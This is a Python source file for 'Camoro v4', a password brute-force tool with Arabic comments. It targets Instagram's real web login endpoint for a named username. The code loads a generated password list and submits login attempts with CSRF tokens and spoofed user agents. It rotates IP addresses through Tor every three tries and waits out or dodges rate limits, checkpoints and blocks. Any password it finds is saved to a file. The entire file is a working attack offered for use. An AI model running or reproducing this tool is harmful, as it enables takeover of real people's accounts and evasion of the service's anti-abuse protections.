#!/usr/bin/env python3

"""
Camoro v4 - Brute Force Engine المدمر
يغير IP كل 3 كلمات مرور باستخدام Tor
يختبر كلمات المرور ضد Instagram API الحقيقي
"""

import json
import os
import sys
import time
import random
import threading
from datetime import datetime

try:
    import httpx
except ImportError:
    print("\033[91m[!] httpx غير مثبت. شغّل: pip install httpx[http2]\033[0m")
    sys.exit(1)

RESULTS_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'results')

GREEN = '\033[0;32m'
RED = '\033[0;31m'
CYAN = '\033[0;36m'
YELLOW = '\033[1;33m'
WHITE = '\033[1;37m'
PURPLE = '\033[0;35m'
NC = '\033[0m'

INSTAGRAM_WEB_APP_ID = "936619743392459"
INSTAGRAM_MOBILE_APP_ID = "124024574287414"

USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.164 Mobile Safari/537.36',
    'Instagram 300.0.0.18.85 Android (34/14; 480dpi; 1080x2400; Samsung; SM-S928B; dm1q; qcom; en_US)',
    'Instagram 301.0.0.20.90 Android (34/14; 420dpi; 1080x2340; Google; Pixel 9; husky; qcom; en_US)',
    'Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36',
]


class CamoroBruteForce:
    """محرك اختبار كلمات المرور مع IP rotation"""
    
    def __init__(self, username, proxy_manager=None):
        self.username = username
        self.proxy_manager = proxy_manager
        self.user_dir = os.path.join(RESULTS_DIR, username)
        
        # إحصائيات
        self.attempt_count = 0
        self.start_time = None
        self.found_password = None
        self.running = True
        
        # تحميل كلمات المرور
        self.passwords = self._load_passwords()
        self.tested = self._load_tested()
        self.remaining = [p for p in self.passwords if p not in self.tested]
        
        # إحصائيات IP
        self.ip_rotations = 0
        self.current_ip = None
    
    def _load_passwords(self):
        """تحميل كلمات المرور"""
        filepath = os.path.join(self.user_dir, 'passwords.txt')
        if not os.path.exists(filepath):
            print(f"{RED}[!] لا يوجد ملف كلمات مرور: {filepath}{NC}")
            print(f"{YELLOW}[*] شغّل أولاً خيار توليد كلمات المرور{NC}")
            return []
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    
    def _load_tested(self):
        """تحميل كلمات المرور المختبرة سابقاً"""
        filepath = os.path.join(self.user_dir, 'tested.txt')
        if os.path.exists(filepath):
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                return set(line.strip() for line in f if line.strip())
        return set()
    
    def _mark_tested(self, password):
        """تسجيل كلمة مرور كمختبرة"""
        filepath = os.path.join(self.user_dir, 'tested.txt')
        with open(filepath, 'a', encoding='utf-8') as f:
            f.write(password + '\n')
        self.tested.add(password)
        self.attempt_count += 1
    
    def _save_success(self, password):
        """حفظ كلمة المرور عند النجاح"""
        filepath = os.path.join(self.user_dir, 'success.txt')
        elapsed = time.time() - self.start_time if self.start_time else 0
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(f"✅ PASSWORD FOUND!\n")
            f.write(f"{'═'*40}\n")
            f.write(f"  Username: {self.username}\n")
            f.write(f"  Password: {password}\n")
            f.write(f"  Attempts: {self.attempt_count}\n")
            f.write(f"  IP Rotations: {self.ip_rotations}\n")
            f.write(f"  Time: {elapsed:.1f} seconds\n")
            f.write(f"  Date: {datetime.now().isoformat()}\n")
        
        self.found_password = password
    
    def _get_client(self):
        """الحصول على httpx client مع IP متغير"""
        if self.proxy_manager:
            return self.proxy_manager.get_httpx_client()
        return httpx.Client(http2=True, verify=False, timeout=30.0)
    
    def _get_headers(self):
        """الهيدرز المطلوبة"""
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "X-IG-App-ID": INSTAGRAM_WEB_APP_ID,
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.instagram.com",
            "Referer": "https://www.instagram.com/",
            "Connection": "keep-alive",
        }
    
    def _test_password(self, client, password):
        """اختبار كلمة مرور واحدة"""
        
        # Instagram يتوقع كلمة السر مشفرة
        timestamp = int(time.time() * 1000)
        enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"
        
        data = {
            'username': self.username,
            'enc_password': enc_password,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'stopDeletionNonce': '',
            'trustedDeviceRecords': '{}',
        }
        
        # جيب CSRF token أولاً
        try:
            # جلب الصفحة للحصول على كوكيز
            client.get(
                'https://www.instagram.com/',
                headers={"User-Agent": random.choice(USER_AGENTS)},
                timeout=15
            )
            time.sleep(random.uniform(0.5, 1.5))
            
            # استخرج CSRF من الكوكيز
            csrf = ""
            if hasattr(client, '_cookies'):
                for cookie in client.cookies:
                    if cookie.name == 'csrftoken':
                        csrf = cookie.value
                        break
            
            headers = self._get_headers()
            if csrf:
                headers['X-CSRFToken'] = csrf
                headers['X-Instagram-AJAX'] = '1'
            
            # جرب تسجيل الدخول
            response = client.post(
                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                headers=headers,
                data=data,
                timeout=20
            )
            
            if response.status_code == 200:
                result = response.json()
                
                if result.get('authenticated'):
                    return {'status': 'success', 'password': password}
                
                if 'checkpoint' in str(result).lower():
                    return {'status': 'checkpoint', 'data': result}
                
                if 'rate_limit' in str(result).lower() or 'wait' in str(result).lower():
                    return {'status': 'rate_limited'}
                
                if 'user' in result and result.get('authenticated') == False:
                    return {'status': 'wrong_password'}
                
                return {'status': 'wrong_password'}
            
            elif response.status_code == 429:
                return {'status': 'rate_limited'}
            elif response.status_code == 403:
                return {'status': 'blocked'}
            else:
                return {'status': 'unknown', 'code': response.status_code}
        
        except httpx.TimeoutException:
            return {'status': 'timeout'}
        except httpx.ConnectError:
            return {'status': 'connection_error'}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def _display_progress(self, tested, total, current, elapsed):
        """عرض التقدم"""
        percent = (tested / total * 100) if total > 0 else 0
        remaining = total - tested
        speed = tested / elapsed if elapsed > 0 else 0
        
        # شريط التقدم
        bar_len = 25
        filled = int(bar_len * tested / total) if total > 0 else 0
        bar = '█' * filled + '░' * (bar_len - filled)
        
        eta = remaining / speed if speed > 0 else 0
        
        line = (
            f"\r{bar} {percent:5.1f}% | "
            f"{tested:>5d}/{total} | "
            f"{speed:4.1f}/s | "
            f"IP: {self.ip_rotations} | "
            f"{current[:25]:25s}"
        )
        
        sys.stdout.write(f"\033[K{line}")
        sys.stdout.flush()
    
    def run(self):
        """تشغيل محرك الهجوم"""
        
        if not self.passwords:
            print(f"{RED}[!] لا توجد كلمات مرور للاختبار{NC}")
            return False
        
        if not self.remaining:
            print(f"{YELLOW}[!] كل الكلمات مختبرة بالفعل ({len(self.tested)}){NC}")
            return False
        
        print(f"\n{PURPLE}╔{'═'*55}╗{NC}")
        print(f"{PURPLE}║{' ' * 10}⚔️  CAMORO BRUTE FORCE ENGINE v4{' ' * 10}║{NC}")
        print(f"{PURPLE}║{' ' * 12}🔄 IP Rotation كل 3 محاولات{' ' * 14}║{NC}")
        print(f"{PURPLE}╚{'═'*55}╝{NC}\n")
        
        print(f"{YELLOW}[*] {WHITE}المستهدف: {GREEN}{self.username}{NC}")
        print(f"{YELLOW}[*] {WHITE}كلمات المرور الكلية: {GREEN}{len(self.passwords):,}{NC}")
        print(f"{YELLOW}[*] {WHITE}مختبرة سابقاً: {YELLOW}{len(self.tested)}{NC}")
        print(f"{YELLOW}[*] {WHITE}المتبقية: {GREEN}{len(self.remaining):,}{NC}")
        print(f"{YELLOW}[*] {WHITE}تغيير IP كل: {GREEN}3 محاولات{NC}")
        print()
        
        # تأكيد
        print(f"{RED}[!] تنبيه: هذه العملية قد تستغرق وقتاً طويلاً{NC}")
        choice = input(f"{YELLOW}[?] {WHITE}هل تريد البدء؟ (Y/N): {NC}").strip().lower()
        if choice != 'y':
            print(f"{YELLOW}[*] تم الإلغاء{NC}")
            return False
        
        self.start_time = time.time()
        
        print(f"\n{CYAN}[*] جاري بدء الهجوم...{NC}")
        print(f"{YELLOW}[*] يمكنك الضغط على Ctrl+C للإيقاف في أي وقت{NC}\n")
        
        try:
            for i, password in enumerate(self.remaining):
                if not self.running:
                    break
                
                # === IP ROTATION: غير IP كل 3 محاولات ===
                if i % 3 == 0:
                    if self.proxy_manager:
                        proxy = self.proxy_manager.rotate_ip()
                        self.ip_rotations += 1
                        if proxy:
                            self.current_ip = proxy
                            # تأخير بعد تغيير IP
                            time.sleep(random.uniform(1, 3))
                
                # === اختبار كلمة المرور ===
                client = self._get_client()
                result = self._test_password(client, password)
                
                # === عرض التقدم ===
                elapsed = time.time() - self.start_time
                self._display_progress(i + 1, len(self.remaining), password, elapsed)
                
                # === معالجة النتيجة ===
                if result['status'] == 'success':
                    print(f"\n\n{GREEN}╔{'═'*55}╗{NC}")
                    print(f"{GREEN}║{' ' * 18}✅ تم العثور على كلمة المرور!{' ' * 16}║{NC}")
                    print(f"{GREEN}╚{'═'*55}╝{NC}")
                    print(f"\n  {WHITE}كلمة المرور: {GREEN}{password}{NC}")
                    print(f"  {WHITE}المحاولات: {YELLOW}{self.attempt_count}{NC}")
                    print(f"  {WHITE}تغييرات IP: {YELLOW}{self.ip_rotations}{NC}")
                    print(f"  {WHITE}الوقت: {YELLOW}{elapsed:.1f} ثانية{NC}")
                    
                    self._save_success(password)
                    return True
                
                elif result['status'] == 'checkpoint':
                    print(f"\n{YELLOW}[!] Checkpoint! انتظر 120 ثانية...{NC}")
                    time.sleep(120)
                    self._mark_tested(password)
                    continue
                
                elif result['status'] == 'rate_limited':
                    wait = random.randint(60, 120)
                    print(f"\n{YELLOW}[!] Rate Limited! انتظر {wait} ثانية...{NC}")
                    time.sleep(wait)
                    # غير IP
                    if self.proxy_manager:
                        self.proxy_manager.rotate_ip()
                        self.ip_rotations += 1
                    self._mark_tested(password)
                    continue
                
                elif result['status'] == 'blocked':
                    print(f"\n{RED}[!] ممنوع 403! غير IP وانتظر 30 ثانية...{NC}")
                    if self.proxy_manager:
                        self.proxy_manager.rotate_ip()
                        self.ip_rotations += 1
                    time.sleep(30)
                    self._mark_tested(password)
                    continue
                
                elif result['status'] == 'timeout' or result['status'] == 'connection_error':
                    print(f"\n{YELLOW}[!] مشكلة اتصال. انتظر 10 ثوان...{NC}")
                    time.sleep(10)
                    # لا تسجلها كمختبرة
                    continue
                
                # === تأخير بين المحاولات ===
                if result['status'] == 'wrong_password':
                    self._mark_tested(password)
                    
                    # تأخير ذكي
                    if (i + 1) % 10 == 0:
                        time.sleep(random.uniform(5, 10))
                    elif (i + 1) % 50 == 0:
                        time.sleep(random.uniform(15, 30))
                        # وغير IP
                        if self.proxy_manager:
                            self.proxy_manager.rotate_ip()
                            self.ip_rotations += 1
                    else:
                        time.sleep(random.uniform(3, 6))
            
            # === انتهى الهجوم ===
            elapsed = time.time() - self.start_time if self.start_time else 0
            print(f"\n\n{YELLOW}╔{'═'*55}╗{NC}")
            print(f"{YELLOW}║{' ' * 16}📊 انتهى الهجوم{' ' * 24}║{NC}")
            print(f"{YELLOW}╚{'═'*55}╝{NC}")
            print(f"\n  {WHITE}كلمات مختبرة: {YELLOW}{self.attempt_count}{NC}")
            print(f"  {WHITE}تغييرات IP: {YELLOW}{self.ip_rotations}{NC}")
            print(f"  {WHITE}الوقت: {YELLOW}{elapsed:.1f} ثانية{NC}")
            print(f"\n{RED}[!] لم يتم العثور على كلمة المرور في هذه المجموعة{NC}")
            print(f"{YELLOW}[*] جرب جمع معلومات إضافية وتوليد مجموعة جديدة{NC}")
            
            return False
            
        except KeyboardInterrupt:
            print(f"\n\n{YELLOW}[!] تم إيقاف الهجوم من قبلك{NC}")
            elapsed = time.time() - self.start_time if self.start_time else 0
            print(f"  {WHITE}المحاولات: {YELLOW}{self.attempt_count}{NC}")
            print(f"  {WHITE}الوقت: {YELLOW}{elapsed:.1f} ثانية{NC}")
            return False


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Camoro - Brute Force v4')
    parser.add_argument('--username', '-u', required=True, help='Target username')
    args = parser.parse_args()
    
    print(f"\n{CYAN}╔{'═'*55}╗{NC}")
    print(f"{CYAN}║{' ' * 12}⚔️  CAMORO v4 BRUTE FORCE{' ' * 16}║{NC}")
    print(f"{CYAN}║{' ' * 12}🔄 IP Rotation + AI{' ' * 20}║{NC}")
    print(f"{CYAN}╚{'═'*55}╝{NC}\n")
    
    # Import proxy manager
    sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
    try:
        from modules.proxy_manager import ProxyManager
        proxy_mgr = ProxyManager()
    except ImportError:
        proxy_mgr = None
    
    engine = CamoroBruteForce(args.username, proxy_manager=proxy_mgr)
    engine.run()
